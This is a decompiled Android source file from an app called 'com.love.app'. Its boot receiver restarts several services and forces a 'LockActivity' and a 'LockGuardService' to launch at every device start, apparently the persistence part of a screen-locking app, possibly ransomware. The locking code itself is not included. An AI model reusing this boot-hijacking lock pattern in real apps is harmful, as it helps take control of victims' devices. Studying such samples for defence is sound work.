/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.content.BroadcastReceiver
 *  android.content.Context
 *  android.content.Intent
 *  android.os.Build$VERSION
 */
package com.love.app;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import com.love.app.ForegroundService;
import com.love.app.JobWakeUpService;
import com.love.app.LockActivity;

public class BootReceiver
extends BroadcastReceiver {
    public void onReceive(Context context, Intent object) {
        if ("android.intent.action.BOOT_COMPLETED".equals(object = object.getAction()) || "android.intent.action.QUICKBOOT_POWERON".equals(object) || "android.intent.action.REBOOT".equals(object)) {
            object = new Intent(context, ForegroundService.class);
            object.putExtra("inputExtra", "Boot Start");
            if (Build.VERSION.SDK_INT >= 26) {
                context.startForegroundService(object);
            } else {
                context.startService(object);
            }
            context.startService(new Intent(context, JobWakeUpService.class));
            object = new Intent(context, LockActivity.class);
            object.addFlags(0x14000000);
            context.startActivity(object);
            object = new Intent(context, LockActivity.LockGuardService.class);
            object.setAction("com.love.app.START_LOCK");
            if (Build.VERSION.SDK_INT >= 26) {
                context.startForegroundService(object);
            } else {
                context.startService(object);
            }
        }
    }
}

